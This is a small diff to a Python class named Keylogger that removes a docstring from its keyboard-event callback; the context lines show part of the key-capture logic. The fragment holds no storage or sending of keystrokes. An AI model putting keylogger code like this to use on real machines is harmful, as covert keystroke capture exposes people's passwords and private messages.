@@ -13,10 +13,6 @@ class Keylogger:
         self.end_dt = datetime.now()
 
     def callback(self, event):
-        """
-        This callback is invoked whenever a keyboard event is occurred
-        (i.e when a key is released in this example)
-        """
         name = event.name
         if len(name) > 1:
             if name == "space":
